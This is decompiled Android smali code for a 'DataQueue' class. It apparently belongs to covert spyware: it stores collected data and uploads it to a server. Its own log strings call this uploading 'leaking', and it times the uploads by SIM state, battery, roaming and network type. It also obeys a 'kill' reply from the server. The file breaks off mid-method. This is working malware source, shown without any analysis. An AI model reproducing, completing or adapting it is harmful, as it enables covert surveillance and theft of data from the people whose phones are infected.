.class public final Lcom/network/android/j;
.super Ljava/lang/Object;


# static fields
.field static final a:Ljava/lang/Object;

.field public static b:Z

.field public static c:Z

.field private static d:Ljava/util/Vector;

.field private static e:Z

.field private static f:Z

.field private static g:Landroid/os/Handler;

.field private static h:Lcom/network/android/b/a;

.field private static i:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x1

    const/4 v1, 0x0

    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    sput-object v0, Lcom/network/android/j;->d:Ljava/util/Vector;

    sput-boolean v1, Lcom/network/android/j;->e:Z

    sput-boolean v1, Lcom/network/android/j;->f:Z

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/network/android/j;->a:Ljava/lang/Object;

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/j;->h:Lcom/network/android/b/a;

    sput-boolean v2, Lcom/network/android/j;->b:Z

    sput-boolean v2, Lcom/network/android/j;->c:Z

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "DataQueueThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/j;->g:Landroid/os/Handler;

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "DataQueueSavingThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/j;->i:Landroid/os/Handler;

    return-void
.end method

.method public static a()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/network/android/j;->g:Landroid/os/Handler;

    return-object v0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 2

    const-string v0, "DataQueue sendDb post"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/j;->g:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/l;

    invoke-direct {v1, p0}, Lcom/network/android/l;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "DataQueue sendDb faild to post"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;[[B)V
    .locals 2

    const-string v0, "DataQueue sendToServer post"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/j;->i:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/k;

    invoke-direct {v1, p1, p2, p3, p0}, Lcom/network/android/k;-><init>(Ljava/lang/String;[Ljava/lang/String;[[BLandroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public static a(Lcom/network/android/i;Landroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "DataQueue addDataDb"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p1}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/network/android/b/a;->a(Lcom/network/android/i;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "addData: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(Ljava/lang/String;Landroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "DataQueue addDataDb"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/network/android/i;

    invoke-direct {v0, p0}, Lcom/network/android/i;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/network/android/b/a;->a(Lcom/network/android/i;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "addData: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(Ljava/lang/String;[Ljava/lang/String;[[BLandroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "DataQueue addData"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/network/android/i;

    invoke-direct {v0, p0, p1, p2}, Lcom/network/android/i;-><init>(Ljava/lang/String;[Ljava/lang/String;[[B)V

    invoke-static {p3}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/network/android/b/a;->a(Lcom/network/android/i;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "addData: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;ZZ)Z
    .locals 6

    const/4 v2, 0x0

    const/4 v3, 0x1

    :try_start_0
    const-string v0, "DataQueue canSend"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz p2, :cond_0

    invoke-static {}, Lcom/network/h/j;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "canSend. not allowed to leak, on upgrade mode"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v0, v2

    :goto_0
    return v0

    :cond_0
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_1

    sget-object v1, Lcom/network/b/b;->C:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_1

    if-eqz p1, :cond_2

    const/4 v1, 0x1

    const/4 v4, 0x7

    const-string v5, "LOG_SIM_NOT_FOUND"

    invoke-static {v1, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :goto_1
    invoke-static {p0}, Lcom/network/android/j;->f(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_1

    if-eqz p1, :cond_4

    const/4 v1, 0x1

    const/16 v4, 0x24

    const-string v5, "LOG_AIRPLANE_MOD"

    invoke-static {v1, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_1
    :goto_2
    if-nez p2, :cond_5

    const/16 v1, 0xa

    invoke-static {v1}, Lcom/network/android/monitor/observer/BatteryReceiver;->a(I)Z

    move-result v4

    const/16 v1, 0x60

    :goto_3
    invoke-static {p0, p1, v4, v1}, Lcom/network/android/j;->a(Landroid/content/Context;ZZS)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v0, "DataQueue can\'t send - low battary"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v0, v2

    goto :goto_0

    :cond_2
    const-string v1, "canSend. not allowed to leak, LOG_SIM_FOUND"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "DataQueue  canSend: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_3
    move v0, v3

    goto :goto_0

    :cond_4
    :try_start_1
    const-string v1, "canSend. not allowed to leak,LOG_AIRPLANE_MOD"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_2

    :cond_5
    const/4 v1, 0x5

    invoke-static {v1}, Lcom/network/android/monitor/observer/BatteryReceiver;->a(I)Z

    move-result v4

    const/16 v1, 0x25

    goto :goto_3

    :cond_6
    const-string v1, "connectivity"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/ConnectivityManager;

    invoke-virtual {v1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v4

    if-eqz v4, :cond_7

    invoke-virtual {v4}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-nez v4, :cond_b

    :cond_7
    const-string v0, "canSend. not allowed to leak, LOG_INTERNET_CONNECTION_FAILED"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz p1, :cond_8

    const/4 v0, 0x1

    const/16 v1, 0x20

    const-string v4, "LOG_INTERNET_CONNECTION_FAILED"

    invoke-static {v0, v1, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_8
    invoke-static {p0}, Lcom/network/android/j;->f(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_9

    if-eqz p1, :cond_a

    const/4 v0, 0x1

    const/16 v1, 0x24

    const-string v4, "LOG_AIRPLANE_MOD"

    invoke-static {v0, v1, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_9
    :goto_4
    move v0, v2

    goto/16 :goto_0

    :cond_a
    const-string v0, "LOG_AIRPLANE_MOD"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_4

    :cond_b
    invoke-static {v0, p0, p1, v1}, Lcom/network/android/j;->a(Landroid/telephony/TelephonyManager;Landroid/content/Context;ZLandroid/net/ConnectivityManager;)Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    move-result v0

    if-nez v0, :cond_3

    move v0, v2

    goto/16 :goto_0
.end method

.method public static a(Landroid/content/Context;ZZS)Z
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x1

    if-eqz p2, :cond_2

    if-eqz p1, :cond_1

    const-string v2, "LOG_SENDING_FAILED_LOW_BATTERY"

    invoke-static {v1, p3, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :goto_0
    sget-boolean v1, Lcom/network/android/j;->b:Z

    if-eqz v1, :cond_0

    sput-boolean v0, Lcom/network/android/j;->b:Z

    const/16 v1, 0x25

    invoke-static {v1}, Lcom/network/android/c/a/b;->a(S)[B

    move-result-object v1

    invoke-static {p0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;[B)V

    :cond_0
    :goto_1
    return v0

    :cond_1
    const-string v1, "canSend. not allowed to leak, LOG_SENDING_FAILED_LOW_BATTERY"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    sput-boolean v1, Lcom/network/android/j;->b:Z

    move v0, v1

    goto :goto_1
.end method

.method public static a(Landroid/telephony/TelephonyManager;)Z
    .locals 3

    invoke-virtual {p0}, Landroid/telephony/TelephonyManager;->isNetworkRoaming()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/network/android/AndroidCallDirectWatcher;->a()Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 v0, 0x1

    :goto_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "DataQueue  isNetworkRoaming: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return v0

    :cond_1
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static a(Landroid/telephony/TelephonyManager;Landroid/content/Context;ZLandroid/net/ConnectivityManager;)Z
    .locals 11

    const/4 v2, 0x0

    const/4 v1, 0x1

    :try_start_0
    const-string v0, "DataQueue isLeakAllowedAccordingToRoaming start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/j;->a(Landroid/telephony/TelephonyManager;)Z

    move-result v0

    if-eqz v0, :cond_8

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "isLeakAllowedAccordingToRoaming Roming!!! NetworkOperator: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/16 v0, 0x23

    invoke-static {v0}, Lcom/network/android/c/a/b;->a(S)[B

    move-result-object v0

    sget-boolean v3, Lcom/network/android/j;->c:Z

    if-eqz v3, :cond_1

    invoke-virtual {p3}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v3

    if-eqz v3, :cond_0

    invoke-virtual {v3}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v3

    if-nez v3, :cond_3

    :cond_0
    const/4 v0, 0x1

    const/16 v3, 0x20

    const-string v4, "LOG_INTERNET_CONNECTION_FAILED"

    invoke-static {v0, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_1
    :goto_0
    invoke-static {}, Lcom/network/b/b;->d()Z

    move-result v0

    if-nez v0, :cond_4

    if-eqz p2, :cond_2

    const/4 v0, 0x1

    const/16 v3, 0x23

    const-string v4, ""

    invoke-static {v0, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_2
    const-string v0, "isLeakAllowedAccordingToRoaming isAllowRoaming. not allowed to leak, LOG_DEVICE_IS_ROAMING"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v1, v2

    :goto_1
    return v1

    :cond_3
    const/4 v3, 0x0

    sput-boolean v3, Lcom/network/android/j;->c:Z

    invoke-static {p1, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;[B)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "isLeakAllowedAccordingToRoaming isAllowRoaming: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1

    :cond_4
    :try_start_1
    invoke-static {}, Lcom/network/b/b;->y()I

    move-result v5

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "isLeakAllowedAccordingToRoaming allowRomingType: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p3}, Landroid/net/ConnectivityManager;->getAllNetworkInfo()[Landroid/net/NetworkInfo;

    move-result-object v6

    array-length v7, v6

    move v4, v2

    move v0, v2

    move v3, v2

    :goto_2
    if-ge v4, v7, :cond_7

    aget-object v8, v6, v4

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "isLeakAllowedAccordingToRoaming NetworkInfo: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ", connected: "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v8}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v8}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v9

    const-string v10, "WIFI"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_5

    invoke-virtual {v8}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v9

    if-eqz v9, :cond_5

    move v3, v1

    :cond_5
    invoke-virtual {v8}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v9

    const-string v10, "MOBILE"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_6

    invoke-virtual {v8}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v8

    if-eqz v8, :cond_6

    move v0, v1

    :cond_6
    add-int/lit8 v4, v4, 0x1

    goto :goto_2

    :cond_7
    packed-switch v5, :pswitch_data_0

    move v0, v2

    :goto_3
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "isLeakAllowedAccordingToRoaming Allow Roming: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v1, v0

    goto/16 :goto_1

    :pswitch_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "isLeakAllowedAccordingToRoaming haveConnectedWifi: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v0, v3

    goto :goto_3

    :pswitch_1
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "isLeakAllowedAccordingToRoaming haveConnectedMobile: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_3

    :pswitch_2
    move v0, v1

    goto :goto_3

    :cond_8
    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/j;->c:Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method public static b(Landroid/content/Context;)V
    .locals 10

    const-string v0, "DataQueue sendAllDb"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    invoke-static {}, Lcom/network/android/g;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "sendAllDb data is in sending proccess - Return"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    const/4 v7, 0x0

    move v0, v7

    :goto_1
    invoke-static {p0}, Lcom/network/android/j;->c(Landroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    move-result v1

    if-eqz v1, :cond_2

    add-int/lit8 v7, v0, 0x1

    :try_start_1
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "sendAllDb "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v8

    invoke-virtual {v8}, Lcom/network/android/b/a;->c()Lcom/network/android/i;

    move-result-object v9

    if-nez v9, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "dataElement == null !!!!! "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v8}, Lcom/network/android/b/a;->b()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    move-result v0

    if-eqz v0, :cond_1

    move v0, v7

    goto :goto_1

    :cond_1
    move v0, v7

    :cond_2
    :goto_2
    :try_start_2
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sendAllDb loop Finish "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    :goto_3
    const-string v0, "sendAllDb end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_3
    :try_start_3
    new-instance v0, Lcom/network/android/g;

    invoke-direct {v0}, Lcom/network/android/g;-><init>()V

    new-instance v2, Lcom/network/android/x;

    invoke-direct {v2, p0}, Lcom/network/android/x;-><init>(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/network/android/SmsReceiver;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v9}, Lcom/network/android/i;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9}, Lcom/network/android/i;->c()[Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v9}, Lcom/network/android/i;->d()[[B

    move-result-object v4

    const/4 v6, 0x0

    move-object v5, p0

    invoke-static/range {v0 .. v6}, Lcom/network/android/g;->a(Ljava/lang/String;Ljava/lang/String;Lcom/network/android/x;[Ljava/lang/String;[[BLandroid/content/Context;[B)V

    iget v0, v2, Lcom/network/android/x;->a:I

    if-nez v0, :cond_4

    const-string v0, "sendAllDb - Succes in send data"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v8, v9}, Lcom/network/android/b/a;->b(Lcom/network/android/i;)Lcom/network/android/i;

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    move v0, v7

    goto/16 :goto_1

    :cond_4
    iget v0, v2, Lcom/network/android/x;->a:I

    const/16 v1, 0x32

    if-ne v0, v1, :cond_5

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "sendAllDb Got kill replay from the server !!!!!: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, v2, Lcom/network/android/x;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " return code: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, v2, Lcom/network/android/x;->a:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/a/c;->a(Landroid/content/Context;)V

    move v0, v7

    goto :goto_2

    :cond_5
    iget v0, v2, Lcom/network/android/x;->a:I

    const/16 v1, 0x64

    if-ne v0, v1, :cond_6

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "sendAllDb Server Fail on proccesing data: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, v2, Lcom/network/android/x;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

